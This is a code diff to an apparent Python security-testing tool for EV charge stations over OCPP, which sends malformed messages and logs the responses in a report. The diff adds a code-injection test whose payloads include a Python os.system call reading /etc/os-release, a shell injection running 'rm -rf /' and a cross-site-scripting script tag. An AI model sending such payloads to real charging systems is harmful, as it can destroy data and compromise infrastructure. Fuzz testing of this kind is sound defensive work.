@@ -9,6 +9,7 @@ import time
 import asyncio
 import random
 import string
+import sys
 
 # Import required system files
 import System
@@ -44,18 +45,18 @@ class ChargePoint(cp):
             match current_state:
                 # Init state -> Currently no function
                 case Names.state_machine.INIT:
-                    print("\n>> CONTROLLER STATE MACHINE: INIT\n")
+                    print('\n\n***\tCONTROLLER STATE MACHINE: INIT\t***\n\n')
                     current_state = Names.state_machine.INFORMATION_GATHERING
 
                 # Information Gathering
                 case Names.state_machine.INFORMATION_GATHERING:
-                    print("\n>> CONTROLLER STATE MACHINE: INFORMATION GATHERING\n")
+                    print('\n\n***\tCONTROLLER STATE MACHINE: INFORMATION GATHERING\t***\n\n')
                     await self.getConfiguration()
                     current_state = Names.state_machine.ATTACK_SZENARIOS
 
                 # Attack szenarios
                 case Names.state_machine.ATTACK_SZENARIOS:
-                    print("\n>> CONTROLLER STATE MACHINE: ATTACK SZENARIOS\n")
+                    print('\n\n***\tCONTROLLER STATE MACHINE: ATTACK SZENARIOS\t***\n\n')
                     # Wrong Data Type
                     await self.falseDataType()
                     
@@ -64,37 +65,36 @@ class ChargePoint(cp):
 
                     # Wrong Data Value (Negative)
                     await self.falseDataNegative()
-
-                    ''' Additional attack ideas '''
                     
-                    # Single missing parameter
-
+                    # Code Injection, testing if CS Backend can be attacked with Python or Java code
+                    await self.codeInjection()
+                    
+                    ''' Additional attack ideas '''                    
                     # Additional unexpected parameter
 
-                    # All missing parameter
+                    # Incorrect Parameter
 
                     # Add Parameter if not required
 
-                    # Code Injection
+
 
                     current_state = Names.state_machine.END
 
                 # End state
                 case Names.state_machine.END:
-                    print("\n>> CONTROLLER STATE MACHINE: END\n")
+                    print('\n\n***\tCONTROLLER STATE MACHINE: END\t***\n\n')
                     #   Generate report document (PDF-File) and exit controller
                     System.generate_report()
                     await asyncio.sleep(5)
                     break
 
                 case Names.state_machine.TIMEOUT:
-                    print("\n>> CONTROLLER STATE MACHINE: TIMEOUT\n")
-                    self.report_store_timeout()
+                    print('\n\n***\tCONTROLLER STATE MACHINE: TIMEOUT\t***\n\n')
                     current_state = Names.state_machine.END
                     
                 # Default state -> Used as undefined state case
                 case _:
-                    print("\n>> CONTROLLER STATE MACHINE: UNDEFINED\n")
+                    print('\n\n***\tCONTROLLER STATE MACHINE: UNDEFINED\t***\n\n')
                     print("[" + str(datetime.datetime.now()) + "]:\t" + "(Controller)\t Undefined state --> Exit")
                     break
 
@@ -119,12 +119,10 @@ class ChargePoint(cp):
 
     # Get Configuration event
     async def getConfiguration(self):
-        print(">> Try to get Configuration")
+        print("\n>>\tINFORMATION GATHERING: Get Configuration\n\n")
 
         request = call.GetConfiguration()
         response = await self.call(request)
-
-        self.printLine()
 
         job_data = dict()
 
@@ -146,15 +144,15 @@ class ChargePoint(cp):
             # Store data in global variables
             if entry['key'] == 'ConnectionTimeOut':
                 timeout_interval = int(entry['value'])
-                print(">>\tTimout interval fetched: " + str(timeout_interval))
+                print("\n\n>>\tTimout interval fetched: " + str(timeout_interval))
 
             if entry['key'] == 'HeartbeatInterval':
                 heartbeat_interval = int(entry['value'])
-                print(">>\tHeartbeat interval fetched: " + str(heartbeat_interval))
+                print("\n\n>>\tHeartbeat interval fetched: " + str(heartbeat_interval))
 
             if entry['key'] == 'NumberOfConnectors':
                 number_of_connectors = int(entry['value'])
-                print(">>\tNumber of connectors: " + str(number_of_connectors))
+                print("\n\n>>\tNumber of connectors: " + str(number_of_connectors))
                 
         job_data = dict()
 
@@ -170,39 +168,10 @@ class ChargePoint(cp):
         data = Report.build_document(job, insertPageBreakAfter=True)
         System.add_to_document(data)
 
-        self.printEvent("Get Configuration")
-
-
-    def report_store_timeout(self):
-        print("Store timeout in report document")
-
-        job_data = dict()
-
-        data_list = [
-            ["Parameter", "Value"]
-        ]
-
-        data_list.append(['Intervall', str(timeout_interval)])
-                      
-        job_data['Timeout'] = data_list
-                
-        # Generate documentation for this action
-        job = System.create_report_job(
-            title='Error', 
-            number=Names.report_state.ATTACKS, 
-            data=job_data
-        )
-                    
-        data = Report.build_document(job, insertPageBreakAfter=True)
-        System.add_to_document(data)
-            
-        self.printLine()
-        return 0
-
 
     async def falseDataType(self):
         # Uses UnlockConnector message
-        print("Try to send a wrong data type using the UnlockConnector function")
+        print("\n>>\tATTACK: False Data Type\t|\tUnlockConnector")
 
         job_data = dict()
 
@@ -221,20 +190,20 @@ class ChargePoint(cp):
             match(i):
                 case 0:
                     # 1. Korrekte Nachricht schicken
-                    print("First attempt: correct data type")
-                    action = 'Correct request'
+                    print("\n\n>>\tFirst attempt: correct data type")
+                    action = 'Correct request (Integer)'
                     payload = 1
 
                 case 1:
                     # 2. Manipulierte Nachricht schicken
-                    print("Second attempt: wrong data type")
-                    action = 'Manipulated request #1'
+                    print("\n\n>>\tSecond attempt: wrong data type")
+                    action = 'Manipulated request #1 (String)'
                     payload = str(1)
 
                 case 2:
                     # 3. Manipulierte Nachricht schicken
-                    print("Third attempt: wrong data type")
-                    action = 'Manipulated request #2'
+                    print("\n\n>>\tThird attempt: wrong data type")
+                    action = 'Manipulated request #2 (Float)'
                     payload = float(1)
 
             data_list.append(['Payload', payload])
@@ -248,7 +217,7 @@ class ChargePoint(cp):
                 response = await self.call(request)
                 data_list.append(['Response (OK)', str(response)])
             except TimeoutError:
-                data_list.append(['Response (TIMEOUT)', 'CS timeout'])  
+                data_list.append(['Response (TIMEOUT)', 'Charge Station connection timed out'])  
             except Exception as error:
                 print(error)
                 data_list.append(['Response (ERROR)', str(error)])                       
@@ -263,17 +232,18 @@ class ChargePoint(cp):
                     
         data = Report.build_document(job, insertPageBreakAfter=True)
         System.add_to_document(data)
-            
+
+        print('\n')        
         self.printLine()
 
     async def generateRandomString(self):
-        length = random.randint(0,500)
+        length = random.randint(0,1024)
         random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
         return random_string
 
     async def falseDataLength(self):
+        print("\n>>\tATTACK: False Data Length\t|\tCancelReservation")
         # Cancel Reservation
-        print("Try to send a wrong length using the CancelReservation function")
 
         job_data = dict()
 
@@ -292,26 +262,26 @@ class ChargePoint(cp):
             match(i):
                 case 0:
                     # 1. Korrekte Nachricht schicken
-                    print("First attempt: correct data type")
+                    print("\n\n>>\tFirst attempt: correct data type")
                     action = 'Correct request'
                     payload = 1
 
                 case 1:
                     # 2. Manipulierte Nachricht schicken
-                    print("Second attempt: random String")
-                    action = 'Manipulated request #1'
-                    payload = await self.generateRandomString()
+                    print("\n\n>>\tSecond attempt: random String")
+                    action = 'Manipulated request #1 (Max Size Integer)'
+                    payload = int(sys.maxsize)
 
                 case 2:
                     # 3. Manipulierte Nachricht schicken
-                    print("Third attempt: random String")
-                    action = 'Manipulated request #2'
+                    print("\n\n>>\tThird attempt: random String")
+                    action = 'Manipulated request #2 (Random Long String)'
                     payload = await self.generateRandomString()
 
                 case 3:
                     # 4. Manipulierte Nachricht schicken
-                    print("Fourth attempt: empty String")
-                    action = 'Manipulated request #3'
+                    print("\n\n>>\tFourth attempt: empty String")
+                    action = 'Manipulated request #3 (Empty String)'
                     payload = '0'
 
             data_list.append(['Payload', payload])
@@ -325,7 +295,7 @@ class ChargePoint(cp):
                 response = await self.call(request)
                 data_list.append(['Response (OK)', str(response)])
             except TimeoutError:
-                data_list.append(['Response (TIMEOUT)', 'CS timeout'])  
+                data_list.append(['Response (TIMEOUT)', 'Charge Station connection timed out'])  
             except Exception as error:
                 print(error)
                 data_list.append(['Response (ERROR)', str(error)])                       
@@ -340,13 +310,14 @@ class ChargePoint(cp):
                     
         data = Report.build_document(job, insertPageBreakAfter=True)
         System.add_to_document(data)
-            
+
+        print('\n')        
         self.printLine()
         
 
     async def falseDataNegative(self):
+        print("\n>>\tATTACK: False Data Value (Negative)\t|\tCancelReservation")
         # ChangeAvailability    
-        print("Try to send false data (negative) using the ChangeAvailability function")
 
         job_data = dict()
 
@@ -365,14 +336,14 @@ class ChargePoint(cp):
             match(i):
                 case 0:
                     # 1. Korrekte Nachricht schicken
-                    print("First attempt: correct value")
+                    print("\n\n>>\tFirst attempt: correct value")
                     action = 'Correct request'
                     payload = 1
 
                 case 1:
                     # 2. Manipulierte Nachricht schicken
-                    print("Second attempt: negative value")
-                    action = 'Manipulated request #1'
+                    print("\n\n>>\tSecond attempt: negative value")
+                    action = 'Manipulated request #1 (Negative Integer)'
                     payload = -1
 
 
@@ -387,7 +358,7 @@ class ChargePoint(cp):
                 response = await self.call(request)
                 data_list.append(['Response (OK)', str(response)])
             except TimeoutError:
-                data_list.append(['Response (TIMEOUT)', 'CS timeout'])  
+                data_list.append(['Response (TIMEOUT)', 'Charge Station connection timed out'])  
             except Exception as error:
                 print(error)
                 data_list.append(['Response (ERROR)', str(error)])                       
@@ -395,19 +366,90 @@ class ChargePoint(cp):
                 
         # Generate documentation for this action
         job = System.create_report_job(
-            title='Attack: falseDataNegative', 
+            title='Attack: False DataValue', 
             number=Names.report_state.ATTACKS, 
             data=job_data
         )
                     
         data = Report.build_document(job, insertPageBreakAfter=True)
         System.add_to_document(data)
-            
+
+        print('\n')        
         self.printLine()
+
+    async def codeInjection(self):
+        # ChangeAvailability    
+        print("\n>>\tATTACK: Code Injection / Cross-Site-Scripting\t|\tRemoteStartTransaction")
+
+        job_data = dict()
+
+        for i in range(0,3):
+
+            if System.getTimeOutState() == True:
+                break
+
+
+            data_list = [
+                ["Parameter", "Value"]
+            ]
+
+            data_list.append(['Event', 'GetDiagnostics'])
+
+            match(i):
+                case 0:
+                    # 1. Korrekte Nachricht schicken
+                    print("\n\n>>\tFirst attempt: Python injection -> OS Detection")
+                    action = 'Python code injection (OS detection)'
+                    payload = "__import__('os').system('cat /etc/os-release')"
+
+                case 1:
+                    # 1. Korrekte Nachricht schicken
+                    print("\n\n>>\tSecond attempt: Shell injection -> Delete File System")
+                    action = 'Python code injection (Delete File System)'
+                    payload = "`; rm -rf /`"
+
+                case 2:
+                    # 2. Manipulierte Nachricht schicken
+                    print("\n\n>>\tThird attempt: ´Cross-Site-Scripting -> Code Injection")
+                    action = 'Cross-Site-Scripting (CSS)'
+                    payload = "<script>alert('Cross-Site-Scripting' + ' ' + 'works!'</script>)"
+
+
+            data_list.append(['Payload', payload])
+            data_list.append(['Type', type(payload)])
+
+            # Example uses the UnlockConnector call
+            request = call.RemoteStartTransaction(payload)
+            data_list.append(['Request', str(request)])
+            
+            try:
+                response = await self.call(request)
+                data_list.append(['Response (OK)', str(response)])
+            except TimeoutError:
+                data_list.append(['Response (TIMEOUT)', 'Charge Station connection timed out'])  
+            except Exception as error:
+                print(error)
+                data_list.append(['Response (ERROR)', str(error)])                       
+            job_data[action] = data_list
+                
+        # Generate documentation for this action
+        job = System.create_report_job(
+            title='Attack: Code Injection / Cross-Site-Scripting', 
+            number=Names.report_state.ATTACKS, 
+            data=job_data
+        )
+                    
+        data = Report.build_document(job, insertPageBreakAfter=True)
+        System.add_to_document(data)
+
+        print('\n')    
+        self.printLine()
+
 
     '''
         Actions initiated by the Charge Station (client)
     '''
+
 
     # BootNotification, triggered every time the Charge Station boots or reboots
     @on(Action.BootNotification)
